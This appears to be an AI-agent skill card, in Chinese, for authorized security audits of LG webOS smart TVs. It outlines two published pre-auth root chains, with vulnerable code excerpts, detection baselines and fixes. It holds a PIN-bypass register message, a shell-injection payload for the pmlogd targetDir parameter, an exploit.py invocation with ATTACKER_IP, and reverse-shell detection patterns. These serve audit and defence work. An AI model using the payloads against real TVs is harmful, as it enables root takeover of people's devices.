---
name: lg-webos-attack-surface
description: "LG webOS 智能电视本地网攻击面审计——2026 SSD sync-demo Preauth RCE 三链组合与 2024 Bitdefender CVE-2023-6317~6320 全量对照，含 PalmServiceBridge/Luna/pmlogd 检测基线与授权验证路径。"
version: 1.0.0
metadata:
  hermes:
    tags: [hack-team, iot, webos, lg-tv, preauth-rce, luna, palmservicebridge, pmlogd, detection-baseline]
    related_skills: [pentest-methodology-fusion, stun-c2-detection, fp-check]
---

# LG webOS 智能电视攻击面审计 (lg-webos-attack-surface)

> 来源：SSD Secure Disclosure `lg-webos-sync-demo-preauth-rce`（2026-10-12 公开，TyphoonPWN 2026 webOS 组三等奖，无 CVE）+
> Bitdefender `vulnerabilities-identified-in-lg-webos`（2024-04-09，CVE-2023-6317~6320）。
> 本卡（gap-20261014-003 / t_85020cc8）经机械检索坐实：共享板此前对 webOS 攻击面 0 覆盖。
> 未在真机复现——链内所有 verification_path 仅限拿到授权 LG 目标后执行。

## 触发条件 / When to Use

- 审计/测试目标为 LG webOS 智能电视（webOS 4~8 各代机型）
- 授权渗透中遇到 3000/3001 端口（SSAP/WSS）或 `luna://` 调用面
- IoT 攻击面资产盘点、智能电视检测规则编写
- 分析 TV 侧 webview/桥接类原语（PalmServiceBridge 同类面）

## 一、攻击面总览

webOS TV 对局域网暴露的攻击面分层（自外向内）：

| 层 | 组件 | 端口/通道 | 作用 |
|----|------|----------|------|
| 1 配对 | SSG (secondscreengateway) | 3000 HTTP / 3001 WSS | ThinQ App 配对，PIN 确认后发 client-key |
| 2 API | SSAP over WSS | 3001 | 持 client-key 调 `luna://<service>/<method>` |
| 3 桥 | PalmServiceBridge | webapp 进程内 | web 页面直调 Luna 系统服务 |
| 4 守护 | PmLogDaemon(pmlogd) 等系统服务 | luna bus | 多数以 root 运行 |

关键设计弱点（两条链共同前提）：
- 3000/3001 本为 LAN 服务，但公网常被误暴露（2024 年 Shodan 命中 91,000+ 台）。
- PIN 交互是唯一用户知情环节；历史链全部围绕"绕过 PIN/绕过提示"展开。
- 受信 webapp 的导航/URL 参数不受校验时，远程页面继承 PalmServiceBridge 权限（SSG ACG 放行面）。

## 二、链 A（2026 SSD，无 CVE）：sync-demo Preauth RCE 三段组合

受影响（SSD 实测，其余未知）：32LQ636BPSA、27TQ600SW，webOS 7.5.7-25（Rockhopper/mullet-mirima），固件 04.54.40。LG 已出修复。

### A1 阶段一：sync-demo 签名清单重放 → 免 PIN 拿 client-key

- 设备镜像内置 `com.webos.app.sync-demo`，内嵌 LG 测试签名的 manifest（appId `com.lge.test`）。
- 测试固件的 `test-signing-cert.pem` 被 SSG 信任；签名校验通过后签名清单内的 permissions 直接拷入新 client profile。
- 提示判定缺陷在 `ClientProfileManager.isPromptRequired()`：

```js
if (newProfile.info.signed && newProfile.info.signed.permissions) {
    if (_.contains(newProfile.info.signed.permissions, "STB_INTERNAL_CONNECTION")) {
        return false;   // 跳过 PIN 提示
    }
}
```

- 重放含 `STB_INTERNAL_CONNECTION` 的签名清单 → 免 PIN 直接拿到 SECURE 层级 client-key。
- 攻击者只需 WSS 连到 `wss://<tv>:3001` 发 `{"type":"register","payload":{"manifest":<重放清单>}}`。

### A2 阶段二：cmp-client interactiveUrl → PalmServiceBridge SSRF

- 签名权限里有 `LAUNCH`/`LAUNCH_WEBAPP`，可拉起内置受信应用 `com.webos.app.cmp-client` 并注入 `params.interactiveUrl`。
- cmp-client 对 interactiveUrl 只做一次 HEAD 探测，`response.ok` 即 `window.location` 跳转——无 scheme/allowlist/origin 校验。
- 导航留在同一 webOS app 实例内，加载的攻击者页面仍握有 `PalmServiceBridge`：

```js
var psb = new PalmServiceBridge();
psb.call("luna://com.webos.service.livepick/getJsonFile", JSON.stringify(payload));
```

- 效果＝SSRF/Luna 中继：以 cmp-client 的受信 ACG 身份调用 WSS 未直接暴露的私有/系统 Luna 方法。

### A3 阶段三：pmlogd collectAllLog targetDir 注入 → root

- `luna://com.webos.pmlogd/collectAllLog` 把 `targetDir`/`targetFile` 直接拼进 shell 字符串：

```c
snprintf(v66, "rm -rf%s", targetDir_var); system(v66);
v43 = g_strdup_printf("cd%s; tar -zcvf%s.tar.gz var; rm -rf%s", targetDir, targetFile, targetDir_var);
system(v43);
```

- payload：`{"targetDir":"X;<CMD>;#","targetFile":"pwn"}` —— 分号截断 + 井号注释。
- PmLogDaemon 以 root 运行，注入命令即 root。PoC 全文见任务卡 evidence e001（exploit.py：纯 Python websockets，非交互，无 UI）。

### 链 A 一句话

零交互、零 PIN、仅局域网可达 3001 即可 root——前提固件信任测试证书且内置 sync-demo 清单。

## 三、链 B（2024 Bitdefender，已修）：CVE-2023-6317~6320

| CVE | 组件/方法 | 原语 | 层级 |
|-----|----------|------|------|
| 2023-6317 | secondscreen.gateway 配对 handler | `skipPrompt` 逻辑缺陷：先用零权限建号拿 client-key，再以它作 `companion-client-key` 建高权限号，服务端只验 key 存在不验归属 → 免 PIN。CWE-639，CVSS 7.2 | preauth 入口 |
| 2023-6318 | cloudupload `processAnalyticsReport` | `type=analytic` 时 `reportFile` 未净化进系统命令；经 `system.notifications/createAlert` 的 `onclose` 内部请求（SSRF 类原语）触达私有服务；`downloadmanager/download` 落地任意名文件满足存在性检查 | root |
| 2023-6319 | attachedstoragemanager `getAudioMetadata` | `fullPath` 指向 .mp3 时找同名 .lrc，UTF-16 BOM 匹配后进 `iconv` 调用未净化 | 注入 |
| 2023-6320 | connectionmanager `setVlanStaticAddress` | `ip_address`/`bcast_address`/`netmask` 三参数未净化；需先 `createVirtualLan` | dbus≈root |

受影响（Bitdefender 实测）：webOS 4.9.7 / 5.5.0 / 6.3.3-442 / 7.3.1-43。2024-03-22 修。
注：6318 的 `createAlert onclose` 与链 A 的 PalmServiceBridge 是同一类"借受信身份触达未暴露 Luna 方法"的模式——跨链复用。

## 四、历史链索引（对照防混）

- RootMyTV（2021-2022，开源越狱）：HLS/DASH 解析缺陷 + `luna://com.webos.applicationManager/launch` 参数注入 → 无线 root（CVE-2021-28158/28159/28160 等），访问一个网页即 root。已修。
- DejaVuln（2022-2023）：`luna://com.webos.lguplus/...` / system broadcast 无校验确认框 → 伪 TV channel XML 拉起任意参数。已修。
- TyphoonPWN 2025（SSD `lg-webos-tv-path-traversal...`）：另一端口 path traversal + 认证绕过全接管。
- 共性：入口轮换（配对/媒体解析/私有端口），中段都是"受信身份触达系统服务"，末段 system()/未净化参数。

## 五、检测基线（防御视角）

TV/侧网侧可落的信号（按链阶段）：

1. **A1 配对异常**：SSG 日志中出现 appId `com.lge.test`、`STB_INTERNAL_CONNECTION` 权限的 register；无 PIN 弹窗却新增 client profile；同一来源 IP 短窗多次 register。
2. **A2 拉起异常**：`applicationManager/launch` 目标为 `com.webos.app.cmp-client` 且 `params.interactiveUrl` 指向 LAN 内非 LG 域；cmp-client 发起 HEAD 后立即跨源导航。
3. **A3 root 注入**：pmlogd 审计参数含 `;` `#` `$()` 反引号或 `targetDir` 出现绝对路径；`cd*; tar -zcvf` 命令行里目录段含元字符；/tmp 下 `mkfifo`+`nc` 反弹特征。
4. **链 B**：createAlert 的 onclose 指向 cloudupload/非通知类服务；`/media/internal/downloads/` 出现 .mp3+.lrc 同名对；setVlanStaticAddress 参数含元字符。
5. **暴露面**：对公网开放 3000/3001 的 TV 清零（Shodan `product:"LG webOs TV"` 监控）。
6. **固件面**：生产固件不应信任 test-signing-cert.pem；镜像内置 sync-demo 签名清单应移除。

## 六、授权验证路径（hack-exploit 用，先过 scope-gate）

仅对书面授权目标执行；无授权 → kanban_block(kind=needs_input)。

```
# 0. 存活/指纹（低噪声）
nmap -sV -p 3000,3001,3002,9996 <tv_ip>
curl -sk https://<tv_ip>:3001/ -o /dev/null -w '%{http_code}\n'   # WSS 面

# 1. A1 复现（SSD PoC，e001 内 exploit.py 全文；非交互 proof 模式）
SHELL_CMD="id > /tmp/fullchain_proof.txt 2>&1" TV_IP=<tv> ATTACKER_IP=<me> python exploit.py
#   判据: /tmp/fullchain_proof.txt 出现 uid=0(root) —— SSD 原文 Step 5 判定法

# 2. 链 B 存量机（2024-03 前/未升级固件）按 Bitdefender 四 CVE 各自 sink 逐点验证

# 3. 版本面
#   SSAP hello / system.settings 取 webOS 与固件号，比对修复线（04.54.40 之后为修复分界，未验证其他机型）
```

## 七、修复要点（审计报告可直接引用）

- 移除 sync-demo 内置签名清单；生产固件不信任 test-signing-cert.pem；`STB_INTERNAL_CONNECTION` 仅限特定 appId/serial 与预期本地调用者（SSD Solution）。
- interactiveUrl 用 `new URL()` 校验 protocol+allowlist；外部内容置于无 Luna 桥的不可信 WebView。
- collectAllLog 的 targetDir/targetFile 按路径组件处理：拒绝 `/`、空白、`;`、`&`、`|`、反引号、`$()`、绝对路径；`system()` 全部换 argv 数组执行，输出固定基目录。
- 更广的类修复：所有拼接 shell 的 Luna 参数做同一套元字符黑名单+白名单路径校验（链 B 四 CVE 同病）。

## 八、证据与引用

- SSD advisory 原文（含完整 PoC + 三段根因 + Solution）：https://ssd-disclosure.com/lg-webos-sync-demo-preauth-rce/ （任务卡 evidence e001 全文落盘）
- THN 报道：https://thehackernews.com/2026/10/lg-smart-tvs-vulnerable-to-pre-auth.html
- Bitdefender 2024：https://www.bitdefender.com/en-us/blog/labs/vulnerabilities-identified-in-lg-webos
- LG 公告：https://lgsecurity.lge.com/bulletins/tv#updateDetails
- 本技能真机验证状态：未复现（无授权目标）；受影响范围仅 SSD 实测两机型，其余"未知"不得外推为"不受影响"。
